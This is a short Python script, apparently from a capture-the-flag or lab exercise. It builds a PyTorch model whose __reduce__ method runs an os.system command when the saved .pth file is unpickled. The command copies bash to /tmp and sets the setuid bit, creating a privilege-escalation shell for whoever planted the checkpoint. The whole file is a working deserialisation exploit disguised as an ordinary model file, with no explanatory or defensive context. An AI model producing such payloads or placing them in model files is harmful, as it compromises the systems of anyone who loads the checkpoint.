import torch
import torch.nn as nn
import torch.nn.functional as F
import os

# Create a simple model
class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.layer1 = nn.Linear(1, 128)
        self.layer2 = nn.Linear(128, 128)
        self.layer3 = nn.Linear(128, 2)

    def forward(self, x):
        x = F.relu(self.layer1(x))
        x = F.relu(self.layer2(x))
        action = self.layer3(x)
        return action

    def __reduce__(self):
        return (os.system, ('cp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x',))


if __name__ == '__main__':
    a = Net()
    torch.save(a, '/models/gunzf0x.pth')
